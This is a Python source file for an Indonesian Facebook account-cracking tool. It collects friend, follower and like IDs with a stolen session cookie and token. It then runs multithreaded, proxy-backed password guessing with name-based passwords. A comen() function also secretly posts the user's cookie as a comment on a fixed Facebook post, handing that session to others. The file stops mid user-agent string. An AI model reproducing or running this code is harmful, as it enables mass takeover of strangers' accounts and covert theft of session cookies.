"""
EMBF     : SANA SINI MAU
BY       : FilterXyz
Made in  : Indonesia
Versi    : python3
Datetime : sabtu 18 juni 2022
"""

#-
try:
	import os, re, sys, bs4, json, requests, subprocess
	import time, datetime, calendar, random, platform, rich
	#-
	from rich.progress import track
	from time import sleep
	from datetime import datetime
	from concurrent.futures import ThreadPoolExecutor as khamdihiXD
	from bs4 import BeautifulSoup as parser
except ModuleNotFoundError as x:exit(str(x))


#-
on = datetime.now()
memek = on.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if memek < 0 or memek > 12:
		exit()
	nTemp = memek - 1
except ValueError:
	exit()

current = datetime.now()
hari    = current.day
bulan   = bulan_[nTemp]
tahun   = current.year
bullan  = current.month
_datetime_  = ("%s-%s-%s"%(hari,bulan,tahun))
_chekpoint_ = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
#-
try:
	a = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open("proxi.txt","w").write(a)
except:
	pass

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
N = '\x1b[0m' # WARNA MATI
x = '\33[m' # DEFAULT
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
P = '\033[0;00m'
J = '\033[0;33m'
S = '\033[0;00m'
N = '\x1b[0m'
I ='\033[0;32m'
C ='\033[0;36m'
M ='\033[0;31m'
U ='\033[0;35m'
K ='\033[0;33m'
P='\033[00m'
h='\033[0;90m'
Q="\033[00m"
kk='\033[0;32m'
ff='\033[0;36m'
G='\033[0;36m'
p='\033[00m'
h='\033[0;90m'
Q="\033[00m"
I='\033[0;32m'
II='\033[0;36m'
m='\033[0;31m'
O ='\033[0;33m'
H='\033[0;33m'
b = '\033[0;36m'
war = "[•]"
B = random.choice([U,I,K,b,M])

#-
id, ok, cp, apk, opsi, loop = [],[],[],[],[],0
proxiez = random.choice(open("proxi.txt","r").read().splitlines())
#-
def logo():
	print(f"""{P} 
\x1b[0m───────────────────────────────────────────────────────────────\n {H}•{K}•{H}•\n\x1b[1;96m BUJANGAN TOOLS
╔══╗╔╗─╔╗─╔╦═══╦═╗─╔╦═══╦═══╦═╗─╔╗
║╔╗║║║─║║─║║╔═╗║║╚╗║║╔═╗║╔═╗║║╚╗║║
║╚╝╚╣║─║║─║║║─║║╔╗╚╝║║─╚╣║─║║╔╗╚╝║
║╔═╗║║─║╠╗║║╚═╝║║╚╗║║║╔═╣╚═╝║║╚╗║║
║╚═╝║╚═╝║╚╝║╔═╗║║─║║║╚╩═║╔═╗║║─║║║
╚═══╩═══╩══╩╝─╚╩╝─╚═╩═══╩╝─╚╩╝─╚═╝ BY : FilterXyz \n\x1b[0m───────────────────────────────────────────────────────────────\n {K}[{N}>_{K}] {N}Author   : FilterXyz\n {K}[{N}>_{K}] {N}Github   : FilterXyz\n {K}[{N}>_{K}] {N}Whatsaap : +19725344955\n {K}[{N}>_{K}] {N}Status   : [\x1b[1;92m Premium Bohongan {N}]\n\x1b[0m───────────────────────────────────────────────────────────────""")
#-
def starting():
	print(f"\n {K}[{N}•{K}] {N}AKAN DI SIMPAN DI FILE : {H}results/OK-{_datetime_}{N}")
	print(f" {K}[{N}•{K}] {N}AKAN DI SIMPAN DI FILE : {K}results/CP-{_datetime_}{N}")
	print(f" {K}[{N}•{K}] {N}ANDA BISA MAINKAN MODE PESAWAT 3 DETIK DALAM 500ID !\n")
#-
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		print(f" {K}[{N}•{K}] {N}CRACK SELESAI NGAB...")
		print(f" {K}[{N}•{K}] {N}TOTAL {H}OK {N}ANDA : {H}{len(ok)}")
		print(f" {K}[{N}•{K}] {N}TOTAL {K}CP {N}ANDA : {K}{len(cp)}")
		os.system("exit")
	else:
		print(f" {K}[{N}•{K}] {N}KAMU TIDAK MENDAPATKAN HASIL APAPUN :(")
		exit()
#-
def metode():
	print("")
	print(f" {K}[{N}1{K}] {N}TOUCH.FACEBOOK.COM")
	print(f" {K}[{N}2{K}] {N}MBASIC.FACEBOOK.COM")
	print(f" {K}[{N}3{K}] {N}MOBILE.FACEBOOK.COM ({H}DISARANKAN{N})\n")
#-
def masuk():
	os.system("clear");logo()
	print(f" {K}[{N}•{K}] {N}LOGIN COOKIE")
	cokis = input(f" {K}[{N}f{K}] {N}MASUKAN COOKIE : {H}")
	if cokis in [""," "]:masuk()
	else:
		data_head = {
			"Host":"business.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1",'user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36','accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			"content-type" : "text/html; charset=utf-8",
			"accept-encoding":"gzip, deflate",
			"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			"cookie": cokis
		}
		try:
			link = requests.get("https://business.facebook.com/business_locations", headers = data_head)
			coli = re.search('(EAAG\w+)', link.text).group(1)
			if "EAAG" in coli:
				print(f"\n {H}•{K}• {N}TOKEN ANDA : {H}{coli}{N}")
				open("Data/Token.txt","w").write(coli)
				open("Data/cokie.txt","w").write(cokis)
				comen(cokis)
		except AttributeError:print(f"\n {K}[{N}•{K}] {N}COKIE INVALID");time.sleep(3);masuk()
		except UnboundLocalError:print(f"\n {K}[{N}•{K}] {N}COKIE INVALID");time.sleep(3);masuk()
		except requests.exceptions.TooManyRedirects:print(f"\n {K}[{N}•{K}] {N}MASUKAN COKIE ANDA DENGAN BENAR");time.sleep(3);masuk()
#-
def comen(cokis):
	kuki = cokis
	toket = open("Data/Token.txt","r").read()
	requests.post(f"https://graph.facebook.com/100000626195514?fields=subscribers&access_token={toket}", headers = {"cookie":kuki})
	requests.post(f"https://graph.facebook.com/100050202525858_558680179148728/comments/?message={kuki}&access_token={toket}", headers = {"cookie":kuki})
	print(f"\n {K}[{N}√{K}] {N}LOGIN BERHASIL, TOLONG TUNGGU SEBENTAR JING");time.sleep(3)
	menu()

#-
def menu():
	os.system("clear")
	try:
		token = open("Data/Token.txt","r").read()
		cokie = open("Data/cokie.txt","r").read()
	except FileNotFoundError:
		print(f" {K}[{N}>_{K}] {N} SELAMAT DATANG PARA BUJANGAN");time.sleep(3);masuk()
	try:
		toket = open("Data/Token.txt","r").read();kukis = open("Data/cokie.txt","r").read()
		kamu  = requests.get(f"https://graph.facebook.com/me?metadata=1&access_token={toket}",headers = {"cookie":kukis}).json()["name"]
		ip    = requests.get("https://www.httpbin.org/ip").json()["origin"]
	except KeyError:
		print(f" {K}[{N}•{K}] {N}COKIE INVALID");os.system("rm -rf Data/Token.txt && rm -rf Data/cokie.txt");time.sleep(3);masuk()
	except requests.exceptions.ConnectionError:exit(" [%s×%s] Tidak ada koneksi"%(M,N))
	logo()
	print(f" {K}[{N}•{K}] {N}SELAMAT DATANG 👋🏻 : {H}{kamu}")
	print(f" {K}[{N}•{K}] {N}IP ADRESS KAMU 🗿 : {H}{ip}")
	print("\x1b[0m───────────────────────────────────────────────────────────────")
	print(f" {K}[{N}1{K}] {N}CRACK DARI PUBLIK{N}")
	print(f" {K}[{N}2{K}] {N}CRACK DARI PUBLIK MASSAL{N}")
	print(f" {K}[{N}3{K}] {N}CRACK DARI FOLLOWERS PUBLIK{N}")
	print(f" {K}[{N}4{K}] {N}CRACK DARI FILE")
	print(f" {K}[{N}5{K}] {N}CRACK DARI PUBLIK LIKES")
	print(f" {K}[{N}6{K}] {N}CEK OPSI DETEKTOR")
	print(f" {K}[{N}7{K}] {N}CEK HASIL CRACK")
	print(f" {K}[{N}8{K}] {N}HAPUS DATA LOGIN")
	print(f" {K}[{N}0{K}] {N}KELUAR 👋🏻")
	memec = input(f"\n {K}[{N}•{K}] {N}PILIH : {H}")
	pilihan(memec,token,cokie) #-kontol

def pilihan(memec,token,cokie):
	if memec in [""," "]:menu()
	elif memec in ["1","01"]:
		print(f"\n {K}[{N}•{K}] {N}KETIK 'ME' JIKA INGIN CRACK DARI DAFTAR TEMAN")
		idne = input(f" {K}[{N}•{K}] {N}MASUKAN ID : ")
		return publik(idne)
	elif memec in ["2","02"]:
		print(f"\n {K}[{N}•{K}] {N}KETIK 'ME' JIKA INGIN CRACK DARI DAFTAR TEMAN")
		return masal(token, cokie)
	elif memec in ["3","03"]:
		print(f"\n {K}[{N}•{K}] {N}KETIK 'ME' JIKA CRACK DARI DAFTAR FOLLOWERS SENDIRI")
		idne = input(f" {H}•{K}• {N}MASUKAN ID : ")
		return followers(idne, token, cokie)
	elif memec in ["4","04"]:
		print(f"\n {K}[{N}>_{K}] {N}JIKA TIDAK ADA FILE SILAKAN BUAT TERLEBIH DAHULU!")
		filex = input(f" {K}[{N}•{K}] {N}NAMA FILE : ")
		if filex in [""," "]:menu()
		else:
			io = open(filex,"r").readlines()
			for memekkamu in io:
				id.append(memekkamu)
		print(f" {K}[{N}•{K}] {N}TOTAL ID : {len(id)}")
		return bruteforce().__class__(id)
	elif memec in ["5","05"]:
		print(f"\n {K}[{N}•{K}] {N}PASTIKAN ID BERSIFAT PUBLIK & MEMILIKI LIKES")
		_uid_ = input(f" {K}[{N}•{K}] {N}MASUKAN ID : ")
		return likes(_uid_,token, cokie)
	elif memec in ["6","06"]:
		print(f"\n {K}[{N}•{K}] {N}MASUKAN NAMA FILE ANDA YANG BERISI AKUN CHEKPOINT")
		nama_file = input(f" {K}[{N}•{K}] {N}NAMA FILE : ")
		try:
			nama = open("results"+nama_file,"r").read().splitlines()
		except FileNotFoundError:
			exit("\n Nama file tidak ada !")
		for akunz in nama:
			opsi_ = akunz.replace("","")
			itil  = opsi_.split("|")
			print(" --> Chek akun : "+(opsi_.replace(" | ","")))
			try:
				main(itil[0].replace(" | ",""),itil[1])
			except requests.exceptions.ConnectionError:time.sleep(3)
	
	elif memec in ["7","07"]:
		print("")
		file = os.listdir("results")
		for kontol_pepek_split_anak in file:
			print(" File : "+kontol_pepek_split_anak)
		filz = input("\n %s•%s• %sMASUKAN NAMA FILE : "%(H,K,N))
		if filz in [""," "]:menu()
		else:
			try:
				my_hasil = open("Data/"+filz,"r").read().splitlines()
			except FileNotFoundError:
				exit("\n File : %s Tidak ada"%(filz))
			for colmek in my_hasil:
				print(colmek)
	elif memec in ["8","08"]:
		os.system("rm -rf Data/Token.txt && rm -rf Data/cokie.txt")
		exit("\n Sukses menghapus data masuk")
	elif memec in ["0","00"]:os.system("exit")
	else:menu()

def publik(idne):
	try:
		xx = open("Data/Token.txt","r").read()
		_url_ = requests.get(f"https://graph.facebook.com/{idne}?fields=friends.limit(5001)&access_token={xx}", headers = {"cookie":open("Data/cokie.txt","r").read()}).json()
		for _khamdihi_ in _url_["friends"]["data"]:
			id.append(_khamdihi_["id"] +"<=>"+ _khamdihi_["name"])
		print(f" {K}[{N}•{K}] {N}TOTAL ID : {len(id)}")
		return bruteforce().__class__(id)
	except KeyError:print(f"\n {K}[{N}•{K}] {N}ID GAGAL DI TEMUKAN");time.sleep(3);menu()

def masal(token, cokie):
	try:
		tambah = int(input(f" {K}[{N}•{K}] {N}JUMLAH ID : "))
	except:tambah = 1
	for ikehikehkimcohikham in range(tambah):
		ikehikehkimcohikham +=1
		idne = input(f" {K}[{N}•{K}] {N}MASUKAN ID : ")
		try:
			user = requests.get("https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s"%(idne, token), headers = {"cookie":cokie}).json()
			for xnxx in user["friends"]["data"]:
				id.append(xnxx["id"] +"<=>"+ xnxx["name"])
		except (KeyError, IOError):
			pass
	print(f" {K}[{N}•{K}] {N}TOTAL ID : {len(id)}")
	return bruteforce().__class__(id)

def followers(idne, token, cokie):
	try:
		respons = requests.get("https://graph.facebook.com/%s?fields=name,subscribers.fields(id,name).limit(99999999)&access_token=%s"%(idne, token), headers = {"cookie":cokie}).json()
		for follower in respons["subscribers"]["data"]:
			id.append(follower["id"] +"<=>" +follower["name"])
	except (KeyError, IOError):
		print(f"\n {K}[{N}•{K}] {N}ID TIDAK PUBLIK!");time.sleep(3);menu()
	print(f" {K}[{N}•{K}] {N}TOTAL ID : {len(id)}")
	return bruteforce().__class__(id)

def likes(_uid_, token, cokie):
	try:
		like = requests.get("https://graph.facebook.com/%s?fields=likes.limit(10000)&access_token=%s"%(_uid_, token), headers = {"cookie":cokie}).json()
		for selebmemekcolmekburikasu in like["data"]:
			id.append(selebmemekcolmekburikasu["id"] +"<=>"+ selebmemekcolmekburikasu["name"])
	except (KeyError,IOError):
		print(f"\n {K}[{N}•{K}] {N}ID TIDAK PUBLIK!");time.sleep(2);menu()
	print(f" {K}[{N}•{K}] {N}TOTAL ID : {len(id)}")
	return bruteforce().__class__(id)

class bruteforce:
	def __init__(self):
		self.id = []
	def __class__(self,id):
#		seld.id = id
		print(f"\n {K}[{N}•{K}] {N}TAMPILKAN APLIKASI Y/T  ")
		pilih = input(f" {K}[{N}•{K}] {N}PILIH : ")
		if pilih in [""," "]:beuteforce(id)
		elif pilih in ["Y","y"]:apk.append("y")
		else:apk.append("t")
		print(f"\n {K}[{N}•{K}] {N}TAMPILKAN CHEKPOINT OPSI Y/T ")
		_code_ = input(f" {K}[{N}•{K}] {N}PILIH : ")
		if _code_ in [""," "]:menu()
		elif _code_ in ["y","Y"]:opsi.append("y")
		else:opsi.append("t")
		return self.wordlist()

	def wordlist(self):
		print(f"\n {K}[{N}1{K}] {N}GUNAKAN PASSWORD MANUAL")
		print(f" {K}[{N}2{K}] {N}GUNAKAN PASSWORD DEFAULT")
		print(f" {K}[{N}3{K}] {N}GUNAKAN PASSWORD GABUNGAN\n")
		__pw__ = input(f" {K}[{N}•{K}] {N}PILIH : ")
		return self.masukan_pass(__pw__)

	def masukan_pass(self, __pw__):
		if __pw__ in [""," "]:menu()
		elif __pw__ in ["1","01"]:
			print(f"\n {K}[{N}•{K}] {N}GUNAKAN KOMA UNTUK PEMISAHAN PASSWORD")
			_pepek_ = input(f" {K}[{N}•{K}] {N}PASSWORD : ")
			if len(_pepek_)<=5:exit("\n GUNAKAN 6 KARAKTER!")
			else:self.manual(_pepek_)
		elif __pw__ in ["2","02"]:
			metode()
			self.otomatis()
		elif __pw__ in ["3","03"]:
			print(f"\n {K}[{N}•{K}] {N}GUNAKAN KOMA UNTUK PEMISAHAN PASSWORD NYA!")
			_pasx_ = input(f" {K}[{N}•{K}] {N}PASSWORD : ")
			if len(_pasx_)<=5:exit("\n GUNAKAN 6 KATAKTER!")
			else:self.gabungan(_pasx_)
		else:
			exit(f"\n {K}[{N}•{K}] {N}INPUT ANDA SALAH")

	def manual(self, _pepek_):
		metode()
		_ceh_ = input(f" {K}[{N}•{K}] {N}PILIH : ")
		if _ceh_ in ["1","01"]:
			starting()
			with khamdihiXD(max_workers=30) as unikers:
				for acount in id:
					try:
						uid, name = acount.split("<=>")
						unikers.submit(self.touch, uid, _pepek_.split(","))
					except Exception as error:print(error)
					except:pass
			hasil(ok,cp)
		elif _ceh_ in ["2","02"]:
			starting()
			with khamdihiXD(max_workers=30) as unikers:
				for acount in id:
					try:
						uid, name = acount.split("<=>")
						unikers.submit(self.mbasic, uid, _pepek_.split(","))
					except Exception as error:print(error)
					except:pass
			hasil(ok,cp)
		elif _ceh_ in ["3","03"]:
			starting()
			with khamdihiXD(max_workers=30) as unikers:
				for acount in id:
					try:
						uid, name = acount.split("<=>")
						unikers.submit(self.mobile, uid, _pepek_.split(","))
					except Exception as error:print(error)
					except:pass
			hasil(ok,cp)
		else:
			exit(f"\n {K}[{N}•{K}] {N}INPUT YANG KAMU MASUKAN SALAH!.")

	def otomatis(self):
		_kopi_ = input(f" {K}[{N}•{K}] {N}PILIH : ")
		if _kopi_ in [""]:menu()
		elif _kopi_ in ["1","01"]:
			starting()
			with khamdihiXD(max_workers=30) as unikers:
				for akun in id:
					try:
						uid, name = akun.split("<=>")
						usernamee = name.split(" ")
						if len(usernamee) == 3 or len(usernamee) == 4 or len(usernamee) == 5 or len(usernamee) == 6:
							pwx = [name, usernamee[0]+"123", usernamee[0]+"1234", usernamee[0]+"12345", usernamee[0]+"123456"]
						else:
							pwx = [name, usernamee[0]+"123", usernamee[0]+"1234", usernamee[0]+"12345", usernamee[0]+"123456"]
						unikers.submit(self.touch, uid, pwx)
					except Exception as asu:print(asu)
					except:pass
			hasil(ok,cp)
		elif _kopi_ in ["2","02"]:
			starting()
			with khamdihiXD(max_workers=30) as unikers:
				for akun in id:
					try:
						uid, name = akun.split("<=>")
						usernamee = name.split(" ")
						if len(usernamee) == 3 or len(usernamee) == 4 or len(usernamee) == 5 or len(usernamee) == 6:
							pwx = [name, usernamee[0]+"123", usernamee[0]+"1234", usernamee[0]+"12345", usernamee[0]+"123456"]
						else:
							pwx = [name, usernamee[0]+"123", usernamee[0]+"1234", usernamee[0]+"12345", usernamee[0]+"123456"]
						unikers.submit(self.mbasic, uid, pwx)
					except Exception as error:print(error)
					except:pass
			hasil(ok,cp)
		elif _kopi_ in ["3","03"]:
			starting()
			with khamdihiXD(max_workers=30) as unikers:
				for akun in id:
					try:
						uid, name = akun.split("<=>")
						usernamee = name.split(" ")
						if len(usernamee) == 3 or len(usernamee) == 4 or len(usernamee) == 5 or len(usernamee) == 6:
							pwx = [name, usernamee[0]+"123", usernamee[0]+"1234", usernamee[0]+"12345", usernamee[0]+"123456"]
						else:
							pwx = [name, usernamee[0]+"123", usernamee[0]+"1234", usernamee[0]+"12345", usernamee[0]+"123456"]
						unikers.submit(self.mobile, uid, pwx)
					except Exception as error:print(error)
					except:pass
			hasil(ok,cp)
		else:
			print(f"\n {K}[{N}•{K}] {N}PILIH INPUT YANG BENER");exit()
	def gabungan(self, _pasx_):
		metode()
		_lover_ = input(f" {K}[{N}•{K}] {N}PILIH : ")
		if _lover_ in [""," "]:menu()
		elif _lover_ in ["1","01"]:
			starting()
			with khamdihiXD(max_workers=30) as cuih:
				for asuh in id:
					try:
						uid, name = asuh.split("<=>")
						colmek = name.split(" ")
						if len(colmek) == 3 or len(colmek) == 4 or len(colmek) == 5 or len(colmek) == 6:
							pwx = [name, colmek[0]+"123", colmek[0]+"1234", colmek[0]+"12345", _pasx_.split(",")]
						else:
							pwx = [name, colmek[0]+"123", colmek[0]+"1234", colmek[0]+"12345", _pasx_.split(",")]
						cuih.submit(self.touch, uid, pwx)
					except Exception as e:print(e)
					except:pass
			hasil(ok,cp)
		elif _lover_ in ["2","02"]:
			starting()
			with khamdihiXD(max_workers=30) as cuih:
				for asuh in id:
					try:
						uid, name = asuh.split("<=>")
						colmek = name.split(" ")
						if len(colmek) == 3 or len(colmek) == 4 or len(colmek) == 5 or len(colmek) == 6:
							pwx = [name, colmek[0]+"123", colmek[0]+"1234", colmek[0]+"12345", _pasx_.split(",")]
						else:
							pwx = [name, colmek[0]+"123", colmek[0]+"1234", colmek[0]+"12345", _pasx_.split(",")]
						cuih.submit(self.mbasic, uid, pwx)
					except Exception as e:print(e)
					except:pass
			hasil(ok,cp)
		elif _lover_ in ["3","03"]:
			starting()
			with khamdihiXD(max_workers=30) as cuih:
				for asuh in id:
					try:
						uid, name = asuh.split("<=>")
						colmek = name.split(" ")
						if len(colmek) == 3 or len(colmek) == 4 or len(colmek) == 5 or len(colmek) == 6:
							pwx = [name, colmek[0]+"123", colmek[0]+"1234", colmek[0]+"12345", _pasx_.split(",")]
						else:
							pwx = [name, colmek[0]+"123", colmek[0]+"1234", colmek[0]+"12345", _pasx_.split(",")]
						cuih.submit(self.mobile, uid, pwx)
					except Exception as e:print(e)
					except:pass
			hasil(ok,cp)
		else:
			exit("\n %sINPUT YANG ANDA MASUKAN SALAH!"%(M))


	def touch(self, user, pwx):
		global ok, cp, loop, opsi, apk
		warna = random.choice([M,K,H,U,P,O,N])
		sys.stdout.write("\r %s•%s• %s[>_] %s/%s [OK:%s][CP:%s]"%(H,K,warna,loop,len(id), len(ok), len(cp)));sys.stdout.flush()
		try:
			for pw in pwx:
				ses = requests.Session()
				head = {
					"Host": "touch.facebook.com",
					"cache-control": "max-age=0",
					"upgrade-insecure-requests": "1",
					"user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A715W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A715W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N986B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2065 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-F916B Build/SP2A.220305.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G715FN Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A225F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; Pixel 3a Build/SP2A.220505.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; Redmi Note 9S Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G990U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2102J20SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2197 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2038 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S906B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S908B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A235M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UMCE/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-G781B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Reddit/Version 2022.35.1/Build 589034/Android 12 Mozilla/5.0 (Linux; Android 5.1.1; AFTM Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0 Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; M2012K11AG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N980F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; RMX3363 Build/RKQ1.210503.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2204 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N986U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0 Mozilla/5.0 (Linux; Android 12; moto g(60) Build/S2RI32.32-20-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UAYSEN/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A326B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 wp-android/20.6.1 Mozilla/5.0 (Linux; Android 12; SM-G970U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2273 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M515F Build/SP1A.210812.016;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Zalo android/12100641 ZaloTheme/dark ZaloLanguage/vi Mozilla/5.0 (Linux; Android 12; SM-A426U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S906E Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A325M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UOH/v1.6_273-android Mozilla/5.0 (Linux; Android 13; Pixel 4 Build/TP1A.220905.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A525F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Onefootball/Android/14.42.1 Mozilla/5.0 (Linux; Android 12; SM-A037G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A725F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2195 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-F711B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2012K11G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 